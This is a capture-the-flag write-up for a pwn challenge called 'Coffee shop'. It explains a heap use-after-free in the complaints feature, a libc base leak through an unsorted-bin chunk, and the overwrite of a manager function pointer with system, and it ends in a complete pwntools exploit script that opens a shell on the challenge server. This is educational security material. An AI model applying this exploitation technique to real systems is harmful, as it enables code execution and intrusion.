# Coffee shop

Category: Pwn

13 solves, 486 points

> Userspace heap feng shui is too complicated. Here is a peak into kernel heap exploitation. Use your instincts. 

Despite the challenge description being somewhat scary, there is no need to know anything about kernel exploitation to solve this challenge. It really is a very simple heap UAF vulnerability.

## Analysis

When the binary is run, we are presented with a menu. We can buy several items, create, edit, delete and view complaints, or speak to the manager. This complaints functionality is the most interesting.

By filing a complaint, we can malloc an arbitrarily sized chunk on the heap. A pointer to this chunk is stored in an array. 

When a complaint is reverted, the chunk is freed, but the pointer to it is not zeroed out. This is a use after free vulnerability.

```c
void revert_complaint(){
  int index;

  index = get_index();
  if ( index != -1 )
    free((void *)complaints[index]);
}
```

Since we are able to read freed chunks, it is possible to leak the libc base by reading the metadata of a unsort bin chunk.

~~Additionally, as we can edit complaints, it is possible to modify the pointers stored in the freed chunk that are used to manage memory allocation. In this exploit, we will deal with the tcache. Tcache freed chunks have the following structure:~~

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;  // the next tcache block
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;  // newly pointer in struct
} tcache_entry;
```

~~By writing an arbitrary memory location to the `next` pointer, we can trick malloc into returning an arbitrary pointer, allowing us to achieve arbitrary writes and thus RCE.~~

EDIT: Actually, we don't even need to do that. We can just allocate and free a suitably size chunk and malloc will return that. We don't need to write to anywhere outside the heap in this exploit.

But where should we write to? Let's look at the `get_manager` function. 

```c
if ( !manager )
    manager = (__int64)malloc(0x10uLL);
```

First, 16 bytes are allocated using malloc. This stores the manager metadata. Next, a menu is printed. Interestingly, if the user enters option 1, a function pointer is called!

```c
if ( v1 == 1 ){
    printf("What's price of your item?: ");
    __isoc99_scanf("%lu", &v2);
    (*(void (__fastcall **)(__int64))(manager + 8))(v2);
}
```

Since `manager` is allocated using malloc, we could get malloc to return a pointer to a chunk we control, like one of the complaints. This would allow us to manipulate the function pointer, setting it to something like `system`, then calling it with `"/bin/sh"` , thus obtaining a shell.

### The plan

Stage 1: Leak libc base (we'll need to find `system` address)

1. Allocate a large chunk (>1032 bytes so that it goes to unsort bin)
1. Allocate a smaller chunk of size 20 (prevents the large chunk merging into the top chunk). We'll call this chunk X
1. Free the first chunk
1. Read chunk X
1. Compute offset from libc base
1. Subtract offset to get libc base

In my case, I found the offset was `0x1ebbe0`.

Stage 2: Writing manager function pointer

1. Allocate a small chunk to act as a stopper to prevent chunk X from being merged with the top chunk
2. Free chunk X
3. Call the `get_manager` function, with option 2 (essentially a no-op). This calls malloc, which returns chunk X.
4. Write chunk X to "AAAAAAAA" + system address
5. Call `get_manager` with option 1. For the item price, we can enter the address of `/bin/sh`. This will allow us to obtain a shell when the function pointer is called.



## Exploit 

```python

from pwn import *

ld = ELF("./ld-2.31.so", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

def edit(index: int, data: bytes|str):
    p.recvuntil('>')
    p.sendline('6')
    p.recvuntil('Please enter your complaint\'s ID:')
    p.sendline(str(index))
    p.recvuntil('Write your complaint (again):')
    p.sendline(data)

def malloc(length: int, data: bytes|str):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('How many characters does your complaint contain:')
    p.sendline(str(length))
    p.recvuntil('Write your complaint:')
    p.sendline(data)


def free(index: int):
    p.recvuntil('>')
    p.sendline('5')
    p.recvuntil('Please enter your complaint\'s ID:')
    p.sendline(str(index))


def read(index: int):
    p.recvuntil('>')
    p.sendline('7')
    p.recvuntil('Please enter your complaint\'s ID:')
    p.sendline(str(index))


e = ELF("./coffee_shop")
context.binary = e

def setup():
    #p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
    p = remote("coffee-shop.chal.idek.team", 1337)
    return p


if __name__ == '__main__':
    p = setup()

    malloc(1279,b"a"*10)
    malloc(20,b"a"*10)
    free(0)
    read(0)
    leak = p.recvline()[1:-1]
    leak = u64(leak+b"\0\0")
    libc.address = leak-0x1ebbe0
    malloc(20,b"a"*10)
    free(1)
    p.sendline("8")
    p.sendline("2")
    edit(1,b"A"*8+p64(libc.sym.system))
    sh = next(libc.search(b"/bin/sh"))
    p.sendline("8")
    p.sendline("1")
    p.sendline(str(sh))
    
    p.interactive()

```